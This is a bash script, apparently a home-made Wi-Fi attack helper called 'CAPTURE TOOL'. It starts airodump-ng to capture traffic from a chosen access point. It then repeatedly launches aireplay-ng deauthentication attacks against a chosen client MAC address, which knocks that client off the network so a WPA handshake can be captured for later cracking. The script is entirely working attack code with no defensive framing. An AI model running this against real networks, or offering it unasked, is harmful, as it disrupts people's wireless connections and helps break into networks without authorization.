#!/bin/bash

#VARIABLES
GREEN="\\033[1;32m"
RED="\\033[1;31m"
WHITE="\\033[1;39m"
YELLOW="\\033[1;33m"
CYAN="\\033[1;36m"
BLUE="\\033[1;34m"

echo -e "$YELLOW""###########################"
echo -e "###### CAPTURE TOOL #######"
echo -e "###########################""$GREEN"
sleep 1
read -p 'CHANNEL ? : ' CHANNEL
read -p 'BSSID ? : ' BSSID
sleep 1
#xterm -e airodump-ng -c $CHANNEL --bssid $BSSID -w /root/Documents/Capture/okok wlan1mon &  # the '&' symbol is for multithreading shell
gnome-terminal -x airodump-ng -c $CHANNEL --bssid $BSSID -w /root/Documents/Capture/okok wlan1mon &
sleep 1
echo -e "$RED""=============================="
echo -e "$RED""=====>> DeAuth Attacks <<====="
echo -e "$RED""==============================""$CYAN"

while :
do
    read -p 'DeAuth attack ? [y/n] ' answer
    read -p 'Same attack ? [y/n] ' loop
    if [ $answer = "y" ];then
        if [ $loop = "y" ];then
            gnome-terminal -x aireplay-ng -0 $nb -a $BSSID -c $MACtarget wlan1mon &
        else
            read -p 'Which station do you want to DeAuth (MAC address) ? : ' MACtarget
            read -p 'How many sending attack ? : ' nb
            #xterm -e aireplay-ng -0 $nb -a $BSSID -c $MACtarget wlan1mon
            gnome-terminal -x aireplay-ng -0 $nb -a $BSSID -c $MACtarget wlan1mon &
        fi
    else
        break
    fi
done
